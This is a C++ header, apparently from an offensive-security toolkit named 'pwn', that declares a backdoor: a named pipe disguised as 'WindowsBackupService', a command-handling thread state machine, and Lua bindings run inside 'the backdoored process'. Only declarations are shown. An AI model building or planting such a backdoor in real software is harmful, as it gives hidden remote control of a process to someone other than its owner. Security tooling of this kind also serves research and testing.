#pragma once

#ifdef PWN_INCLUDE_BACKDOOR
#include "common.hpp"

///
/// Definition of the `pwn` module in the Lua VM
///
EXTERN_C_START
#include <lauxlib.h>
#include <lua.h>
#include <lualib.h>
EXTERN_C_END


#ifdef PWN_BUILD_FOR_WINDOWS
#define PWN_BACKDOOR_PIPENAME                                                                                          \
    L"\\\\.\\pipe\\WindowsBackupService"                                                                               \
    L"_" STR(__cplusplus) L"_" STR(_MSC_VER)
#define PWN_BACKDOOR_MAX_MESSAGE_SIZE 2048
#else
#error "todo: backdoor for linux"
#endif

///
/// @brief Interface for the backdoor
/// This interface is cross-plaform and should not expose/use any OS-specifics.
///
namespace pwn::backdoor
{

enum class ThreadState
{
    Uninitialized,
    // Wait for a new command
    ReadyToRead,
    // Pending read I/O
    ReadInProgress,
    // Command read, process and reply
    ReadFinished,
    // Received the TerminationEvent or a error occured, wait for last IO to finish
    Stopping,
    // Close & clean up
    Stopped,
};

typedef class _ThreadConfig
{
public:
    _ThreadConfig() :
        Tid(0),
        Lock(),
        hThread(INVALID_HANDLE_VALUE),
        hPipe(INVALID_HANDLE_VALUE),
        hStateChangeEvent(INVALID_HANDLE_VALUE),
        request(nullptr),
        response(nullptr),
        pLuaVm(nullptr),
        command_number(0)
    {
        this->hStateChangeEvent = ::CreateEvent(nullptr, false, false, nullptr);
        this->State             = ThreadState::Uninitialized;

        ::RtlSecureZeroMemory(&this->oReadWrite, sizeof(OVERLAPPED));
    }

    bool
    SetState(ThreadState NewState)
    {
        std::lock_guard<std::mutex> scoped_lock(this->Lock);
        this->State = NewState;
        return ::SetEvent(this->hStateChangeEvent);
    }

    friend std::ostream&
    operator<<(std::ostream& os, const _ThreadConfig& obj)
    {
        os << "Client(Tid=" << obj.Tid << ")";
        return os;
    }

    u32 Tid;
    std::mutex Lock;
    ThreadState State;
    std::unique_ptr<u8[]> request;
    usize request_size;
    std::unique_ptr<u8[]> response;
    usize response_size;
    usize command_number;
    lua_State* pLuaVm;

    HANDLE hThread;
    HANDLE hPipe;
    HANDLE hStateChangeEvent;
    OVERLAPPED oReadWrite;

} ThreadConfig;

///
/// @brief Start the backdoor thread
///
/// @return the thread id of the listening thread on success; an Error() otherwise
///
Result<bool> PWNAPI
start();


///
/// @brief Stop the backdoor thread, in a thread safe way
///
/// @return Ok() on success, Error() on error
///
Result<bool> PWNAPI
stop();


namespace lua
{
///
/// @brief Wrapper for `pwn::version`
/// Takes no argument
/// Returns the version a string
///
/// @param l
/// @return int
///
int
pwn_version(lua_State* l);

///
/// @brief Wrapper for `pwn::utils::hexdump`
/// Takes:
/// - Bytearray to hexdump
/// Returns the hexdump as a string
///
/// @param l
/// @return int
///
int
pwn_utils_hexdump(lua_State* l);

///
/// @brief Wrapper for `pwn::process::pid`
/// Takes no argument
/// Returns the pid of the backdoored process as a string
///
/// @param l
/// @return int
///
int
pwn_process_pid(lua_State* l);

} // namespace lua
}; // namespace pwn::backdoor

#endif // PWN_INCLUDE_BACKDOOR
